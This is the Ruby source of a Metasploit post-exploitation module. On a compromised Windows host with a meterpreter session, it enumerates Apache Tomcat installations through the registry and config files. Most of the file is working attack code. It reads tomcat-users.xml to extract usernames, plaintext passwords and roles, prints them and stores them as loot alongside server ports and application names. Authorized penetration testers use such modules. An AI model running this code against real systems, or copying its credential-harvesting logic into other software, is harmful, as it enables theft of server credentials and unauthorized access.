##
# ## This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'rex'
require 'rexml/document'
require 'msf/core'
require 'msf/core/post/file'
require 'msf/core/post/common'
require 'msf/core/post/windows/registry'

class Metasploit3 < Msf::Post

	include Msf::Post::File
	include Msf::Post::Common
	include Msf::Post::Windows::Registry
	include Msf::Auxiliary::Report

	def initialize(info={})
		super( update_info( info,
			'Name'          => 'Windows Gather Tomcat Server Enumeration',
			'Description'   => %q{ This module will enumerate a windows system for tomcat servers},
			'License'       => MSF_LICENSE,
			'Author'        => [
				'Barry Shteiman <barry[at]sectorix.com>', # Module author
			],
			'Platform'      => [ 'windows' ],
			'SessionTypes'  => [ 'meterpreter' ]
		))
	end
	
	
	# method called when command run is issued
	def run

		results = []
		users = []
		print_status("Enumerating Tomcat Servers on #{sysinfo['Computer']}")
		if check_tomcat
			results += enumerate_tomcat
			users += enumerate_tomcat_creds
		end
		if results.empty?
			print_status("Done, Tomcat Not Found")
			return
		end	
		print_status("Done, Tomcat Found.")
		
		tbl_services = Rex::Ui::Text::Table.new(
			'Header'  => "Tomcat Applications ",
			'Indent'  => 1,
			'Columns' =>
				[
					"Host",
					"Tomcat Version",
					"Port",
					"Web Application"
				])

		results.each { |r|
			report_service(:host => session.sock.peerhost, :port => r[2], :name => "HTTP", :info => "#{r[0]} #{r[1]}, Application:#{r[3]}")
			tbl_services << r
		}
				
		tbl_users = Rex::Ui::Text::Table.new(
			'Header'  => "Tomcat Server Users ",
			'Indent'  => 1,
			'Columns' =>
				[
					"Host",
					"User",
					"Password",
					"Roles"
				])
				
		users.each { |u|
			tbl_users << [ session.sock.peerhost,u[0],u[1],u[2] ]
		}
		
		print_line()
		print_line(tbl_services.to_s)
		print_line(tbl_users.to_s)
		p = store_loot("host.webservers.tomcat", "text/plain", session, tbl_services.to_s + "\n" + tbl_users.to_s, "tomcat.txt", "Tomcat Server Enum")
		print_status("Results stored in: #{p}")
	end
	
	
	### initial identification methods ###
	
	# method for checking if webserver is installed on server - tomcat
	def check_tomcat
		key = "HKLM\\SOFTWARE\\Apache Software Foundation"
		if registry_enumkeys(key).include?("Tomcat")
			print_status("\tTomcat found.")
			return true
		end
		return false
	rescue
		return false
	end

	
	### deep server enumeration methods ###
	
	# enumerate tomcat
	def enumerate_tomcat
		results = []
		found = false
		basekey = "HKLM\\SOFTWARE\\Apache Software Foundation\\Tomcat"
		instances = registry_enumkeys(basekey)
		if not instances.nil? and not instances.empty?
			instances.each do |i|
				next if found
				versionkey = "#{basekey}\\#{i}"
				val_installpath = registry_getvaldata(versionkey,"InstallPath")
				val_version = registry_getvaldata(versionkey,"Version")
				print_good("\t\t+ Version: #{val_version}")	
				
				if not exist?(val_installpath + "\\conf\\server.xml")
					print_error("\t\t! tomcat configuration not found")
					next
				end
				
				appname = find_application_name(val_installpath)
				
				ports = []
				xml_data = read_file(val_installpath + "\\conf\\server.xml")
				doc = REXML::Document.new(xml_data)
				doc.elements.each('Server/Service/Connector') do |e|
					ports << e.attributes['port']
				end
				ports.uniq.each do |p|
					print_good("\t\t+ Port: #{p}")	
					found = true
					results << [session.sock.peerhost,"#{val_version}",p,appname]
				end
				if found
					print_good("\t\t+ Application: [#{appname}]")
				else
					print_error("\t\t! port not found")
				end
			end
		end
		return results
	rescue
		print_error("\t\t! could not identify information")
		return results || []
	end
	
	# enumerate tomcat users from its user base
	def enumerate_tomcat_creds
		users = []
		found = false
		basekey = "HKLM\\SOFTWARE\\Apache Software Foundation\\Tomcat"
		instances = registry_enumkeys(basekey)
		if not instances.nil? and not instances.empty?
			instances.each do |i|
				next if found
				versionkey = "#{basekey}\\#{i}"
				val_installpath = registry_getvaldata(versionkey,"InstallPath")
				val_version = registry_getvaldata(versionkey,"Version")
				userpath = val_installpath + "\\conf\\tomcat-users.xml"
				if exist?(userpath)
					xml_data = read_file(userpath)
					doc = REXML::Document.new(xml_data)
				
					doc.elements.each('tomcat-users/user') do |e|
						users << [ e.attributes['name'],e.attributes['password'],e.attributes['roles'] ]
						print_good("\t\t+ User:[#{e.attributes['name']}] Pass:[#{e.attributes['password']}] Roles:[#{e.attributes['roles']}]")
					end
				end
			end
		end
		return users
	rescue
		print_error("\t\t! could not identify users")
		return users || []
	end
	
	### helper functions ###
	
	#this function extracts the application name from the main page of the web application
	def find_application_name(val_installpath)
		index_file = ['index.html','index.htm','index.php','index.jsp','index.asp']
		path = val_installpath + "\\webapps"
		if not directory?(path + "\\ROOT")
			print_error("\t\t! expected directory wasnt found")
			return "UNKNOWN"
		end
		
		index_file.each do |i|
			
			if not exist?("#{path}\\ROOT\\#{i}")
				next
			end
			data = read_file(path + "\\ROOT\\#{i}")
			
			if data =~ /(?i)<title>([^<]+)<\/title>/
				return $1
			else
				#look for redirect as name
				if data =~ /(?i)onload=\"?document.location=['"]?([\/\w\d]+)['"]?\"?/
					return $1.gsub("/","")
				end
			end
		end
		return ""
	rescue
		print_error("\t\t! could not identify application name")
		return "UNKNOWN"
	end
	
end